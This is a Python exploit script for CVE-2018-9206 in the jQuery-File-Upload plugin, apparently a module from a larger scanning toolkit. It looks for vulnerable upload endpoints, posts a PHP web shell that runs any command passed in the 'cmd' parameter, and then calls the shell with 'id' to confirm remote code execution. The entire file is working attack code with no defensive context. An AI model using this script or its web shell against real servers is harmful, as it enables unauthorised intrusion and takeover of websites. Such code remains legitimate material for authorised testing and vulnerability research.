#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo
import urllib3
urllib3.disable_warnings()

DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36"

PATHS = [
    "{prefix}/server/php/upload.class.php",
    "{prefix}/example/upload.php",
    "{prefix}/server/php/UploadHandler.php",
    "{prefix}/php/index.php"
]

OUTPUTS = [
    "{prefix}/example/files/shell.php",
    "{prefix}/php/files/shell.php",
    "{prefix}/server/node-express/public/files/shell.php",
    "{prefix}/server/node/public/files/shell.php",
    "{prefix}/server/php/files/shell.php"
]

SHELL_CONTENT = "<?php system($_GET['cmd']); ?>"

class Cve_2018_9206:
    def safe_concat(self,host, path):
        host = host[:-1] if host.endswith('/') else host
        path = path[1:] if path.startswith('/') else path

        return host + '/' + path


    def is_path_available(self,url):
        OutPrintInfo("JQuery", f'Testing {url} ...')
        r = requests.head(url,verify=self.verify, headers={
            'User-Agent': DEFAULT_USER_AGENT
        })
        return r.status_code == 200


    def send_web_shell(self,url):
        OutPrintInfo("JQuery", f'Sending webshell ...')
        r = requests.post(url, verify=self.verify,files={
            'files[]': ('shell.php', SHELL_CONTENT),
        }, headers={
            'User-Agent': DEFAULT_USER_AGENT
        })

        OutPrintInfo("JQuery", r)


    def probe_web_shell(self,host):
        OutPrintInfo("JQuery", f'Probing the webshel ...')

        for path in OUTPUTS:
            formatted_path = path.format(prefix=self.prefix)
            url = self.safe_concat(host, formatted_path)
            r = requests.get(url,verify=self.verify, params={
                'cmd': 'id'
            }, headers={
                'User-Agent': DEFAULT_USER_AGENT
            })

            if r.status_code == 200:
                OutPrintInfo("JQuery", f'Success ({formatted_path})!')
                OutPrintInfo("JQuery", r.text)
                break


    def handle_success(self,host, path, url):
        OutPrintInfo("JQuery", f'Found path: {path}')
        self.send_web_shell(url)
        self.probe_web_shell(host)


    def main(self,target):
        host = target["url"].strip('/ ')
        self.prefix = 'jQuery-File-Upload'
        self.verify = target["ssl"]
        OutPrintInfo("JQuery", f'Starting the scan for {host} ...')


        for path in PATHS:
            url = self.safe_concat(host, path.format(prefix=self.prefix))
            if self.is_path_available(url):
                self.handle_success(host, path, url)
                break
        else:
            OutPrintInfo("JQuery", 'Error: A vulnerable jQuery was not found!')

